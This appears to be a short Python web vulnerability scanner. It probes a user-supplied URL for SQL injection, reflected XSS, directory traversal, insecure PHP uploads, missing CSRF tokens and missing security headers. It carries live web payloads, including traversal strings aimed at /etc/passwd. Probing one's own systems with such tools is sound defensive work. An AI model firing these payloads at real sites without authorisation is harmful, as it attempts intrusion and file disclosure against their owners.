import requests
from bs4 import BeautifulSoup

# send a GET request to the target URL
def send_get_request(url, params=None):
    try:
        response = requests.get(url, params=params, timeout=10)
        return response
    except requests.RequestException as e:
        print(f"Error while sending request: {e}")
        return None

# detection of SQL Injection vulnerabilities
def sql_injection_scan(url):
    payloads = ["'", '"', "' OR '1'='1", '" OR "1"="1', "' OR 1=1 --", '" OR 1=1 --']
    print(f"\n[+] Scanning for SQL Injection vulnerabilities at {url}")
    
    for payload in payloads:
        target_url = f"{url}?id={payload}"
        response = send_get_request(target_url)
        
        if response and any(error in response.text for error in ["SQL syntax", "Warning: mysql", "Unclosed quotation"]):
            print(f"[!] Potential SQL Injection vulnerability found with payload: {payload}")

# detection of XSS vulnerabilities
def xss_scan(url):
    payload = "<script>alert('XSS')</script>"
    print(f"\n[+] Scanning for XSS vulnerabilities at {url}")
    response = send_get_request(url)
    
    if response:
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        for form in forms:
            action = form.get("action")
            form_url = url + action if action else url
            form_data = {}
            for input_tag in form.find_all("input"):
                input_name = input_tag.get("name")
                input_type = input_tag.get("type", "text")
                if input_name and input_type == "text":
                    form_data[input_name] = payload
            try:
                response = requests.post(form_url, data=form_data, timeout=10)
                if payload in response.text:
                    print(f"[!] Potential XSS vulnerability found in form action: {form_url}")
            except requests.RequestException as e:
                print(f"Error while sending form request: {e}")

# check for CSRF protection
def csrf_check(url):
    print(f"\n[+] Checking for CSRF protection at {url}")
    response = send_get_request(url)
    
    if response:
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form')
        
        for form in forms:
            if form.find("input", {"name": "csrf_token"}) is None:
                action = form.get("action")
                form_url = url + action if action else url
                print(f"[!] CSRF token missing in form action: {form_url}")

# check for security headers
def check_security_headers(url):
    print(f"\n[+] Scanning HTTP headers for security at {url}")
    response = send_get_request(url)
    
    if response:
        missing_headers = []
        headers = response.headers
        
        if 'Content-Security-Policy' not in headers:
            missing_headers.append("Content-Security-Policy")
        if 'Strict-Transport-Security' not in headers:
            missing_headers.append("Strict-Transport-Security")
        if 'X-Frame-Options' not in headers:
            missing_headers.append("X-Frame-Options")
        
        if missing_headers:
            print(f"[!] Missing security headers: {', '.join(missing_headers)}")

# detection of directory traversal vulnerabilities
def directory_traversal_scan(url):
    payloads = ["../../../../etc/passwd", "../../boot.ini"]
    print(f"\n[+] Scanning for directory traversal vulnerabilities at {url}")
    
    for payload in payloads:
        target_url = f"{url}?file={payload}"
        response = send_get_request(target_url)
        
        if response and ("root:x" in response.text or "boot loader" in response.text):
            print(f"[!] Potential directory traversal vulnerability found with payload: {payload}")

# detection of insecure file uploads
def insecure_file_upload_scan(url):
    print(f"\n[+] Checking for insecure file uploads at {url}")
    response = send_get_request(url)
    
    if response:
        soup = BeautifulSoup(response.text, 'html.parser')
        forms = soup.find_all('form', {"enctype": "multipart/form-data"})
        
        for form in forms:
            action = form.get("action")
            form_url = url + action if action else url
            
            # Attempt to upload a test PHP file
            files = {'file': ('test.php', '<?php echo "Vulnerable"; ?>', 'application/php')}
            try:
                response = requests.post(form_url, files=files, timeout=10)
                if response and "Vulnerable" in response.text:
                    print(f"[!] Insecure file upload detected at: {form_url}")
            except requests.RequestException as e:
                print(f"Error while uploading file: {e}")

# Main function to initiate all scans
def start_scan(url):
    sql_injection_scan(url)
    xss_scan(url)
    csrf_check(url)
    check_security_headers(url)
    directory_traversal_scan(url)
    insecure_file_upload_scan(url)

if __name__ == "__main__":
    target_url = input("Enter the target URL: ")
    start_scan(target_url)
